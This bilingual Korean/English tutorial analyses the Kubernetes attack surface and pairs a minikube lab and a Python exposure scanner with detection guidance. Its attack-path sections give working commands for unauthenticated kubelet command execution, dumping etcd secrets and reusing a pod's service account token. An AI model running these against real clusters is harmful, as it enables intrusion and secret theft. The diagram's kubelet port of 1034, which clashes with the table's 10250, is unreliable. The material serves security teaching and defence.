> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 쿠버네티스 공격 표면 분석

## 쿠버네티스란 무엇인가?

쿠버네티스(Kubernetes, K8s)는 컨테이너 오케스트레이션 플랫폼입니다. 쉽게 말하면, 수십~수천 개의 컨테이너(앱)를 자동으로 배포·관리·복구해주는 시스템입니다. 마치 **항공사 관제탑**처럼, 비행기(컨테이너)들이 어디서 뜨고 내릴지 조율합니다.

공격자 입장에서 K8s는 흥미로운 타깃입니다. 하나의 클러스터를 장악하면 수백 개의 컨테이너와 그 안의 데이터를 한꺼번에 장악할 수 있기 때문입니다.

---

## 1. 쿠버네티스 아키텍처 — 공격자의 눈으로 보기

```
┌─────────────────────────────────────────────────────────────┐
│                      쿠버네티스 클러스터                       │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐  │
│  │                    컨트롤 플레인 (마스터 노드)           │  │
│  │                                                       │  │
│  │  ┌──────────────┐  ┌──────────┐  ┌───────────────┐  │  │
│  │  │  API Server  │  │ etcd DB  │  │  Scheduler    │  │  │
│  │  │  (포트 6443) │  │(포트2379)│  │  Controller   │  │  │
│  │  └──────────────┘  └──────────┘  └───────────────┘  │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                             │
│  ┌────────────────┐  ┌────────────────┐                     │
│  │  워커 노드 1   │  │  워커 노드 2   │                     │
│  │  ┌──────────┐  │  │  ┌──────────┐  │                     │
│  │  │ kubelet  │  │  │  │ kubelet  │  │                     │
│  │  │(포트1034)│  │  │  │(포트1034)│  │                     │
│  │  ├──────────┤  │  │  ├──────────┤  │                     │
│  │  │ Pod A    │  │  │  │ Pod C    │  │                     │
│  │  │ Pod B    │  │  │  │ Pod D    │  │                     │
│  │  └──────────┘  │  │  └──────────┘  │                     │
│  └────────────────┘  └────────────────┘                     │
└─────────────────────────────────────────────────────────────┘
```

### 핵심 컴포넌트와 공격 포인트

| 컴포넌트 | 역할 | 기본 포트 | 공격 시 노린다면? |
|---------|------|-----------|----------------|
| **API Server** | K8s의 모든 제어 진입점 | 6443 (HTTPS) | 미인증 접근 시 클러스터 전체 장악 |
| **etcd** | 클러스터 상태/시크릿 저장 DB | 2379-2380 | 직접 접근 시 모든 시크릿 탈취 가능 |
| **kubelet** | 노드에서 파드 실행 관리 | 10250 | 읽기 API 노출 시 파드 내용 접근 |
| **Dashboard** | 웹 UI | 8001 (proxy) | 인증 없이 노출 시 GUI 완전 제어 |
| **kube-proxy** | 네트워크 라우팅 | 10249 | 네트워크 정책 우회 |

---

## 2. 주요 공격 경로

### 경로 1: 공개된 API 서버
초기 K8s 버전들은 익명 접근을 허용했습니다. `--anonymous-auth=true` 설정이 남아 있으면 인증 없이 API 서버를 쿼리할 수 있습니다.

```bash
# 공격자가 먼저 시도해보는 것들
curl -sk https://TARGET_IP:6443/api/v1/namespaces
curl -sk https://TARGET_IP:6443/version
```

### 경로 2: 노출된 kubelet API
kubelet의 읽기 전용 포트(10255) 또는 인증 없는 쓰기 포트(10250)가 열려 있으면:

```bash
# 노드의 모든 파드 목록 조회 (인증 없이)
curl -sk http://TARGET_IP:10255/pods

# 파드 내 명령 실행 (인증 없는 10250)
curl -sk https://TARGET_IP:10250/run/default/pod-name/container-name \
  -d "cmd=id"
```

### 경로 3: etcd 직접 접근
etcd가 TLS 없이 열려 있으면 모든 시크릿이 노출됩니다.

```bash
# etcd 직접 쿼리 (TLS 미적용 환경)
etcdctl --endpoints=http://TARGET_IP:2379 get / --prefix --keys-only
etcdctl --endpoints=http://TARGET_IP:2379 get /registry/secrets --prefix
```

### 경로 4: 컨테이너 내부에서 탈출
취약한 앱이 파드 안에 있으면, RCE 후 쿠버네티스 API를 악용합니다.

```bash
# 파드 내부에서 서비스 계정 토큰 확인
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# 이 토큰으로 API 서버에 인증
curl -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces
```

---

## 3. 실습: minikube 환경 구축

### 3.1 minikube 설치 (Ubuntu/Debian 기준)

```bash
# Docker 설치 (이미 있으면 스킵)
sudo apt-get update && sudo apt-get install -y docker.io
sudo usermod -aG docker $USER
newgrp docker

# minikube 다운로드 및 설치
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube

# kubectl 설치
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install kubectl /usr/local/bin/kubectl

# minikube 시작
minikube start --driver=docker
```

### 3.2 클러스터 상태 확인

```bash
# 클러스터 정보 확인
kubectl cluster-info

# 노드 상태
kubectl get nodes -o wide

# 모든 파드 상태 (kube-system 포함)
kubectl get pods --all-namespaces

# API 서버 버전
kubectl version
```

### 3.3 공격 표면 스캔 스크립트

```python
#!/usr/bin/env python3
"""
K8s 공격 표면 빠른 스캔 도구
사용법: python3 k8s_surface_scan.py --target 192.168.64.100
"""
import argparse
import socket
import urllib.request
import urllib.error
import ssl
import json
import sys
from typing import NamedTuple


class ScanResult(NamedTuple):
    port: int
    service: str
    open: bool
    detail: str


def check_port(host: str, port: int, timeout: float = 2.0) -> bool:
    """TCP 포트 열려있는지 확인"""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def fetch_url(url: str, timeout: float = 3.0) -> tuple[int, str]:
    """URL 가져오기, SSL 검증 무시"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "k8s-scanner/1.0"})
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            return resp.status, resp.read(4096).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, str(e.reason)
    except Exception as e:
        return -1, str(e)


def scan_api_server(host: str) -> ScanResult:
    """API 서버 익명 접근 확인"""
    if not check_port(host, 6443):
        return ScanResult(6443, "API Server", False, "포트 닫힘")

    status, body = fetch_url(f"https://{host}:6443/api/v1/namespaces")
    if status == 200:
        detail = "위험! 익명 접근 허용됨 — 네임스페이스 목록 노출"
    elif status == 403:
        detail = "보호됨 (403 Forbidden) — 인증 필요"
    elif status == 401:
        detail = "보호됨 (401 Unauthorized)"
    else:
        detail = f"응답 코드: {status}"

    return ScanResult(6443, "API Server", True, detail)


def scan_kubelet(host: str) -> list[ScanResult]:
    """kubelet 포트 확인"""
    results = []

    # 읽기 전용 포트 (deprecated이지만 구버전에 존재)
    if check_port(host, 10255):
        status, body = fetch_url(f"http://{host}:10255/pods")
        detail = "위험! 읽기 포트 노출 — 파드 목록 접근 가능" if status == 200 else f"포트 열림, 응답: {status}"
        results.append(ScanResult(10255, "kubelet read-only", True, detail))
    else:
        results.append(ScanResult(10255, "kubelet read-only", False, "포트 닫힘 (정상)"))

    # 쓰기 포트
    if check_port(host, 10250):
        status, body = fetch_url(f"https://{host}:10250/pods")
        if status == 200:
            detail = "위험! 인증 없이 kubelet API 접근 가능"
        elif status == 401:
            detail = "보호됨 (인증 필요)"
        else:
            detail = f"포트 열림, 응답: {status}"
        results.append(ScanResult(10250, "kubelet API", True, detail))
    else:
        results.append(ScanResult(10250, "kubelet API", False, "포트 닫힘 (정상)"))

    return results


def scan_etcd(host: str) -> ScanResult:
    """etcd TLS 미적용 여부 확인"""
    if not check_port(host, 2379):
        return ScanResult(2379, "etcd", False, "포트 닫힘 (정상)")

    status, body = fetch_url(f"http://{host}:2379/v2/keys")
    if status == 200:
        detail = "위험! etcd TLS 없이 노출 — 모든 시크릿 접근 가능"
    else:
        detail = f"포트 열림, 응답: {status} (TLS 적용 가능성)"

    return ScanResult(2379, "etcd", True, detail)


def scan_dashboard(host: str) -> ScanResult:
    """K8s 대시보드 노출 확인"""
    for port in [8001, 8443, 30000]:
        if check_port(host, port):
            status, body = fetch_url(f"http://{host}:{port}")
            if "kubernetes" in body.lower() or "dashboard" in body.lower():
                return ScanResult(port, "K8s Dashboard", True, f"위험! 대시보드 노출 (포트 {port})")
            return ScanResult(port, "K8s Dashboard", True, f"포트 {port} 열림")

    return ScanResult(8001, "K8s Dashboard", False, "대시보드 미노출")


def print_result(result: ScanResult) -> None:
    status_icon = "🔴" if result.open and "위험" in result.detail else ("🟢" if not result.open else "🟡")
    print(f"  {status_icon} [{result.service}] 포트 {result.port}: {result.detail}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="쿠버네티스 공격 표면 스캔 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시: python3 k8s_surface_scan.py --target 192.168.64.100"
    )
    parser.add_argument("--target", required=True, help="대상 호스트 IP 또는 도메인")
    parser.add_argument("--timeout", type=float, default=2.0, help="연결 타임아웃 (초, 기본값: 2.0)")
    args = parser.parse_args()

    print(f"\n[*] 쿠버네티스 공격 표면 스캔: {args.target}")
    print("=" * 60)

    # API 서버 스캔
    print("\n[API Server]")
    print_result(scan_api_server(args.target))

    # kubelet 스캔
    print("\n[kubelet]")
    for r in scan_kubelet(args.target):
        print_result(r)

    # etcd 스캔
    print("\n[etcd]")
    print_result(scan_etcd(args.target))

    # 대시보드 스캔
    print("\n[Dashboard]")
    print_result(scan_dashboard(args.target))

    print("\n" + "=" * 60)
    print("[완료] 스캔 종료. 위험 항목은 즉시 보안 조치 필요.")


if __name__ == "__main__":
    main()
```

### 3.4 스크립트 실행

```bash
# minikube IP 확인
MINIKUBE_IP=$(minikube ip)
echo "minikube IP: $MINIKUBE_IP"

# 스캔 실행
python3 k8s_surface_scan.py --target $MINIKUBE_IP
```

---

## 4. 유용한 리소스

- **kube-bench** (CIS K8s Benchmark 자동 점검): https://github.com/aquasecurity/kube-bench
  - 수백 개의 보안 항목을 자동으로 체크해주는 도구입니다.
  ```bash
  # minikube에서 kube-bench 실행
  kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
  kubectl logs job.batch/kube-bench
  ```

- **쿠버네티스 공식 보안 문서**: https://kubernetes.io/docs/concepts/security/

---

## 4.5 탐지 신호 매핑: 공격 경로 → 감사 로그

예방(RBAC·TLS·PSA)이 1차 방어선이라면, 탐지는 우회를 가정한 2차 방어선입니다. K8s 감사 로그(API Server `--audit-policy-file`)와 런타임 보안 도구(Falco)는 각 공격 경로에 대해 관측 가능한 신호를 남깁니다.

| 공격 경로 | 1차 신호원 | 탐지 단서 |
|---|---|---|
| API Server 익명 접근 | 감사 로그 | `user: system:anonymous`의 비-discovery 요청 |
| kubelet API 남용 (10250) | kubelet 로그, NetFlow | 노드→파드 `exec`/`run` 직접 호출 |
| etcd 직접 접근 | etcd 감사, 네트워크 | 2379 포트로의 비-apiserver 출발지 |
| 서비스 계정 토큰 오용 | 감사 로그 | 동일 SA 토큰의 비정상 동사(`create pods`, `secrets get`) |
| 권한 상승 (RBAC) | 감사 로그 | `rolebindings`/`clusterrolebindings` create·escalate 동사 |
| 파드 탈출 시도 | Falco 런타임 | `setns`, 호스트 마운트 접근, 권한 컨테이너 spawn |

> 탐지 설계 원칙: 감사 로그는 켜져 있어야 신호가 된다. 많은 클러스터가 감사 정책을 비활성화한 채 운영되어, 침해 후에도 "무슨 일이 있었는지" 재구성하지 못한다. 최소한 `RequestResponse` 레벨로 `pods/exec`, `secrets`, RBAC 리소스를 기록하고, 로그를 클러스터 외부로 전송(탬퍼링 방지)해야 한다. 퍼플팀 관점에서는 위 각 경로를 실행한 뒤 해당 신호가 실제로 수집·탐지되는지 검증한다([[68_Purple_Team]] 참조).

---

## 5. 핵심 정리

| 항목 | 내용 |
|-----|------|
| 가장 위험한 노출 | etcd 무인증, API Server 익명 접근 |
| 기본 점검 포트 | 6443, 2379, 10250, 10255, 8001 |
| 실습 환경 | minikube (로컬), kind, k3s |
| 첫 번째 방어선 | RBAC 활성화 + TLS 강제 적용 |

---

<a name="english"></a>

# Kubernetes Attack Surface Analysis

## What Is Kubernetes?

Kubernetes (K8s) is a container orchestration platform — a system that automatically deploys, manages, and recovers containers at scale. Think of it like an **airport control tower** coordinating hundreds of flights (containers) landing and taking off.

From an attacker's perspective, K8s is an attractive target: compromise one cluster and you potentially control hundreds of containers and all their data simultaneously.

---

## 1. Kubernetes Architecture — An Attacker's View

```
┌─────────────────────────────────────────────────────────────┐
│                    Kubernetes Cluster                        │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐  │
│  │                Control Plane (Master Node)             │  │
│  │                                                       │  │
│  │  ┌──────────────┐  ┌──────────┐  ┌───────────────┐  │  │
│  │  │  API Server  │  │ etcd DB  │  │  Scheduler    │  │  │
│  │  │  (port 6443) │  │(port2379)│  │  Controller   │  │  │
│  │  └──────────────┘  └──────────┘  └───────────────┘  │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                             │
│  ┌────────────────┐  ┌────────────────┐                     │
│  │  Worker Node 1 │  │  Worker Node 2 │                     │
│  │  ┌──────────┐  │  │  ┌──────────┐  │                     │
│  │  │ kubelet  │  │  │  │ kubelet  │  │                     │
│  │  │(port1034)│  │  │  │(port1034)│  │                     │
│  │  ├──────────┤  │  │  ├──────────┤  │                     │
│  │  │ Pod A    │  │  │  │ Pod C    │  │                     │
│  │  │ Pod B    │  │  │  │ Pod D    │  │                     │
│  │  └──────────┘  │  │  └──────────┘  │                     │
│  └────────────────┘  └────────────────┘                     │
└─────────────────────────────────────────────────────────────┘
```

### Key Components and Attack Points

| Component | Role | Default Port | If Exposed... |
|-----------|------|-------------|---------------|
| **API Server** | Single entry point for all control | 6443 (HTTPS) | Full cluster takeover if unauthenticated |
| **etcd** | Stores all cluster state and secrets | 2379-2380 | All secrets extractable with direct access |
| **kubelet** | Manages pod execution on nodes | 10250 | Pod inspection/exec if auth disabled |
| **Dashboard** | Web UI | 8001 (proxy) | Full GUI control if exposed without auth |
| **kube-proxy** | Network routing | 10249 | Network policy bypass |

---

## 2. Main Attack Paths

### Path 1: Exposed API Server
Early K8s versions allowed anonymous access. If `--anonymous-auth=true` is set, the API server can be queried without credentials.

```bash
# First things an attacker tries
curl -sk https://TARGET_IP:6443/api/v1/namespaces
curl -sk https://TARGET_IP:6443/version
```

### Path 2: Exposed kubelet API
If the read-only port (10255) or unauthenticated write port (10250) is open:

```bash
# List all pods on a node (no auth required)
curl -sk http://TARGET_IP:10255/pods

# Execute commands in a pod (unauthenticated 10250)
curl -sk https://TARGET_IP:10250/run/default/pod-name/container-name \
  -d "cmd=id"
```

### Path 3: Direct etcd Access
If etcd runs without TLS, all secrets are exposed.

```bash
# Query etcd directly (no-TLS environment)
etcdctl --endpoints=http://TARGET_IP:2379 get / --prefix --keys-only
etcdctl --endpoints=http://TARGET_IP:2379 get /registry/secrets --prefix
```

### Path 4: Escape from Inside a Container
If a vulnerable app runs in a pod, use RCE to abuse the Kubernetes API.

```bash
# Read service account token from inside a pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Authenticate to the API server with that token
curl -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces
```

---

## 3. Lab: Setting Up a minikube Environment

### 3.1 Install minikube (Ubuntu/Debian)

```bash
# Install Docker (skip if already installed)
sudo apt-get update && sudo apt-get install -y docker.io
sudo usermod -aG docker $USER && newgrp docker

# Download and install minikube
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube

# Install kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install kubectl /usr/local/bin/kubectl

# Start minikube
minikube start --driver=docker
```

### 3.2 Verify Cluster Status

```bash
kubectl cluster-info
kubectl get nodes -o wide
kubectl get pods --all-namespaces
kubectl version
```

### 3.3 Running the Attack Surface Scanner

```bash
MINIKUBE_IP=$(minikube ip)
python3 k8s_surface_scan.py --target $MINIKUBE_IP
```

---

## 4. Useful Resources

- **kube-bench** (automated CIS K8s Benchmark checks): https://github.com/aquasecurity/kube-bench
- **Kubernetes Official Security Docs**: https://kubernetes.io/docs/concepts/security/

---

## 4.5 Detection Signal Mapping: Attack Path → Audit Log

If prevention (RBAC/TLS/PSA) is the first line, detection is the second line that assumes bypass. K8s audit logs (API Server `--audit-policy-file`) and runtime tools (Falco) leave observable signals for each attack path.

| Attack path | Primary signal source | Detection clue |
|---|---|---|
| API Server anonymous access | Audit log | Non-discovery requests from `user: system:anonymous` |
| kubelet API abuse (10250) | kubelet log, NetFlow | Direct node→pod `exec`/`run` calls |
| Direct etcd access | etcd audit, network | Non-apiserver source to port 2379 |
| Service account token abuse | Audit log | Unusual verbs from one SA token (`create pods`, `secrets get`) |
| Privilege escalation (RBAC) | Audit log | `rolebindings`/`clusterrolebindings` create/escalate verbs |
| Pod escape attempt | Falco runtime | `setns`, host mount access, privileged container spawn |

> Design principle: audit logs are only a signal if they're turned on. Many clusters run with the audit policy disabled and cannot reconstruct "what happened" even after a breach. At minimum, log `pods/exec`, `secrets`, and RBAC resources at `RequestResponse` level and ship logs off-cluster (anti-tampering). From a purple-team view, execute each path above and verify the signal is actually collected and detected (see [[68_Purple_Team]]).

---

## 5. Key Takeaways

| Item | Detail |
|------|--------|
| Most dangerous exposures | etcd without auth, API Server anonymous access |
| Ports to check first | 6443, 2379, 10250, 10255, 8001 |
| Practice environments | minikube (local), kind, k3s |
| First line of defense | Enable RBAC + enforce TLS everywhere |
